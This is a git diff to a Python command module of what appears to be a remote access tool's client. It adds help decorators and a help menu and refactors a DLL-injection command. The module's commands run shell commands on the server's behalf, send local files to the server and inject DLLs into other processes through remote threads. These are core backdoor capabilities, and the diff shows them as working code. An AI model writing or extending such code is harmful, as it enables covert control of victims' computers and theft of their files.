@@ -1,14 +1,69 @@
+import inspect
 import locale
 import os
 import subprocess
+from functools import wraps
 
 from util.common_util import parse_args
 from util.win32util import *
 
 
+def desc(text: str):
+    """
+    为被添加注解的函数设置命令帮助
+    """
+
+    def attr_decorator(func):
+        setattr(func, 'help', text)
+        return func
+
+    return attr_decorator
+
+
+def params(arg_list: list):
+    """
+    为被添加注解的函数设置属性
+    """
+
+    def attr_decorator(func):
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            # 解析函数参数获得参数字典
+            arg_dict = parse_args(arg_list, args[0])
+            # 遍历参数字典
+            for key in arg_dict:
+                # 为函数设置属性
+                setattr(func, key, arg_dict[key])
+            # 将对函数自身的引用添加到函数的第一个参数
+            return func(func, *args, **kwargs)
+
+        # 保留函数原始参数
+        wrapper.__signature__ = inspect.signature(func)
+        return wrapper
+
+    return attr_decorator
+
+
 class Command:
 
     @staticmethod
+    @desc('show this help')
+    def help():
+        """
+        显示帮助菜单
+        """
+        method_list = [method for method in dir(Command) if not method.startswith('__')]
+        commands = {}
+        for method_name in method_list:
+            method = getattr(Command, method_name)
+            if hasattr(method, 'help'):
+                commands[method_name] = method.help
+            else:
+                commands[method_name] = None
+        return 1, '\n'.join(f'{key:12}{value}' for key, value in commands.items())
+
+    @staticmethod
+    @desc('change directory')
     def cd(path):
         """
         切换目录
@@ -22,6 +77,7 @@ class Command:
             return 0, 'Cannot find the path specified'
 
     @staticmethod
+    @desc('execute shell command')
     def shell(command):
         """
         执行shell命令
@@ -38,6 +94,7 @@ class Command:
             return 1, ''
 
     @staticmethod
+    @desc('download file')
     def download(server, filename):
         """
         给服务端发送文件
@@ -48,11 +105,12 @@ class Command:
             server.send_result(0, 'File does not exist')
 
     @staticmethod
-    def inject(arg):
+    @desc('inject DLL into process')
+    @params(['pid', 'dll_path'])
+    def inject(this, args):
         """
         远程线程注入
         """
-        pid, dll_path = parse_args(['pid', 'dll_path'], arg)
-        if not os.path.isfile(dll_path):
-            return 0, 'File does not exist: {}'.format(dll_path)
-        return create_remote_thread(int(pid), os.path.abspath(dll_path))
+        if not os.path.isfile(this.dll_path):
+            return 0, 'File does not exist: {}'.format(this.dll_path)
+        return create_remote_thread(int(this.pid), os.path.abspath(this.dll_path))
